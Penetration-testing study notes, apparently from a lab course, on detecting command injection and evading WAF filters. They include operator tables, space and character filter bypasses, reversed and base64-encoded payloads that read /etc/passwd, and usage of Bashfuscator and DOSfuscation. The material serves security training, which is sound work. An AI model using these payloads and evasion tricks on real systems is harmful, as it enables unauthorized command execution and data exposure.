## Detection

Common Command Injection Operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)** Command inside       |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)** Command inside       |
>[!Note:]
>Front-end may be validating user input. **Capture in Burp and Repeat the paylod to bypass front-end sanitization!** May as well try encoded/obfuscated payload off the bat: `$($(rev<<<'imaohw'))`

Most common operators to be used for various injection types:

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

---
## Identify WAF Filters

- Test each injection operator - whichever one does not get blocked is NOT blacklisted
	- Use Burp Intruder > Sniper + Payload Processing (URL)
	- Only operators, no OS commands for now
### Bypassing **Space** Filters
- Some WAF may filter for spaces / `+`
	- Bypass with **Tabs**, **$IFS**, or **Brace Expansion**
#### Using Tabs
Using tabs (`%09`) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same:
```url
%09
e.g:
\n  = %0a%09
```
#### Using $IFS
Using the (`$IFS`) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments:
```url
${IFS}
e.g:
\n  = %0a${IFS}
```
#### Using Brace Expansion
The `Bash Brace Expansion` feature automatically adds spaces between arguments wrapped between braces:
```url
{ls,-la}
e.g:
\n  = %0a{ls,-la}
```

>[!NOTE:]
>Other ways to [Bypass Space Filters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

### Bypassing Other Blacklisted **Characters**

Other commonly blacklisted characters include:
- `/`
- `\`
#### Linux

In Linux, we can bypass this filter by specifying specific characters in environment variables:

| **Character** | **Command**         | **Notes**                                                   |
| ------------- | ------------------- | ----------------------------------------------------------- |
| `/`           | `${PATH:0:1}`       | We can do the same with `$HOME` and `$PWD` variable as well |
| `;`           | `${LS_COLORS:10:1}` | Specifies the starting position and string to select        |

>[!Note:]
>We can get all environment variables with `printenv`
#### Windows

In Windows, we can *ALSO* bypass this filter by specifying specific characters in environment variables:

| **Character** | **Command**             | **Notes**                                                   |
| ------------- | ----------------------- | ----------------------------------------------------------- |
| `\`           | `%HOMEPATH:~6,-11%%`    | Cmd - Specifies starting position and negative end position |
| `\`           | `$env:HOMEPATH[0]`      | PowerShell - Specifies the first character                  |
| `\`           | `$env:PROGRAMFILES[10]` | PowerShell - Specifies the 10th character                   |
>[!Note:]
>In PowerShell, we can get all environment variables with `Get-ChildItem Env:`

#### Character Shifting
The following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```bash
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
\

echo $(tr '!-}' '"-~'<<<:)
;
```

>[!Note:]
>We can use PowerShell commands to perform Character Shifting as well

---

### Bypassing Blacklisted **Commands**

#### Linux & Windows

```bash
w'h'o'am'i
w"h"o"am"i
```

#### Linux Only

```bash
who$@ami
w\ho\am\i
```

#### Windows Only

```cmd
who^ami
```

---

### Advanced Command Obfuscation
For when WAFs are implemented.
#### Case Manipulation

In **Windows**, CMD and PowerShell are case-insensitive:
```CMD & PowerShell
WhOaMi
```

In **Linux**, since it is case-sensitive, we must replace the uppercase with lowercase:
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

#### Reversed Commands
##### Linux

```bash
echo 'whoami' | rev
$(rev<<<'imaohw')
```

##### Windows

```PowerShell
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

#### Encoded Commands

##### Linux

```bash
echo -n 'cat /etc/passwd' | base64 # 1st way to encode
echo -n whoami | iconv -f utf-8 -t utf-16le | base64 # 2nd way to encode

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk) # Note that we are using <<< to avoid using a pipe |, assuming it is a filtered character.
```

>[!Note:]
>Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques in the above sections (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.

##### Windows

```PowerShell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

>[!Note:]
>Other methods can be utilized such as: wildcards, regex, output redirection, integer expansion, and others. See more techniques [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

---

### Evasion Tools

#### Linux (Bashfuscator)
Utilize for obfuscating bash commands:

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
./bashfuscator -h
./bashfuscator -c 'cat /etc/passwd' # Basic usage, refine it with switches
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)" # Obfuscated command

bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"' # Test obfuscated command
```

#### Windows  (DOSfuscation)
Interactive tool for obfuscating commands:

```PowerShell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

Invoke-DOSfuscation> help
Invoke-DOSfuscation> tutorial
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt # Obfuscated command

typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt # Test obfuscated command
```

>[!Note:]
>Remember, we can run Windows tools on Linux with `pwsh`

id